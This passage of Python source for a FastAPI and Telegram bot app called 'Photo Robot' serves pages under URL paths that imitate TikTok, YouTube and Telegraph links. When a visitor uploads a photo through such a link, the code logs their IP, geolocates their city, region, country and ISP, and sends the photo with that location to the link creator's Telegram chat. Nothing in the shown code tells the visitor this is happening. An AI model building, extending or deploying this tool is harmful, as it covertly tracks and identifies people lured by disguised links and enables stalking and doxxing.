    if used == 1:
        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
    if used == 2:
        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)

    if expected_service == "tiktok":
        return HTMLResponse(generate_tiktok_page(token))
    if expected_service == "youtube":
        return HTMLResponse(generate_youtube_page(token))
    return HTMLResponse(
        generate_telegraph_page(
            token,
            title or DEFAULT_TELEGRAPH_TITLE,
            content or DEFAULT_TELEGRAPH_CONTENT,
            bool(show_photo),
        )
    )


@app.get("/", response_class=HTMLResponse)
async def root():
    return "<h3>Photo Robot is running.</h3>"


@app.get("/@{identifier}")
async def tiktok_link(identifier: str):
    return render_service_link(identifier, "tiktok")


@app.get("/shorts/{identifier}")
async def youtube_link(identifier: str):
    return render_service_link(identifier, "youtube")


@app.get("/article/{identifier}")
async def telegraph_link(identifier: str):
    return render_service_link(identifier, "telegraph")


# Compatibility with links created by the previous version of app.py.
# Crucially, this fallback ONLY looks for Telegraph rows; it no longer opens
# TikTok/YouTube records through the generic route.
@app.get("/{identifier}")
async def legacy_telegraph_link(identifier: str):
    return render_service_link(identifier, "telegraph")


@app.post("/api/send/{token}")
async def send_photo(token: str, request: Request, photo: UploadFile = File(...)):
    row = get_link(token)
    if not row:
        raise HTTPException(404, "Ссылка не найдена")

    owner_chat_id, used, service, title, content, show_photo = row
    if used != 0:
        raise HTTPException(410, "Ссылка уже использована или обрабатывается")

    content_type = (photo.content_type or "").lower()
    if content_type not in {"image/jpeg", "image/png", "image/webp"}:
        raise HTTPException(415, "Разрешены только изображения")

    data = await photo.read(MAX_PHOTO_BYTES + 1)
    if not data or len(data) > MAX_PHOTO_BYTES:
        raise HTTPException(413, "Фото слишком большое")

    if not claim_link(token):
        raise HTTPException(410, "Ссылка уже использована или обрабатывается")

    ip = client_ip(request)
    geo = await lookup_ip(ip)
    city = geo.get("city") or "не определён"
    region = geo.get("region") or "не определён"
    country = geo.get("country") or "не определена"
    isp = (geo.get("connection") or {}).get("isp") or "не определён"
    service_emoji = SERVICES.get(service, {}).get("emoji", "📸")

    caption = (
        f"{service_emoji} Получено фото по вашей ссылке\n\n"
        f"🌐 IP: {ip}\n"
        f"🏙 Город: {city}\n"
        f"🗺 Регион: {region}\n"
        f"🌍 Страна: {country}\n"
        f"📡 Провайдер: {isp}\n\n"
        "ℹ️ Местоположение определено приблизительно по IP и может отличаться от фактического."
    )

    try:
        await bot.send_photo(
            chat_id=owner_chat_id,
            photo=BufferedInputFile(data, filename="photo.jpg"),
            caption=caption,
        )
    except Exception as exc:
        release_link(token)
        raise HTTPException(502, "Не удалось доставить фото в Telegram") from exc

    finish_link(token)
    return JSONResponse({"ok": True})


async def main():
    db_init()
    config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="info")
    server = uvicorn.Server(config)
    await asyncio.gather(server.serve(), dp.start_polling(bot))


if __name__ == "__main__":
    asyncio.run(main())
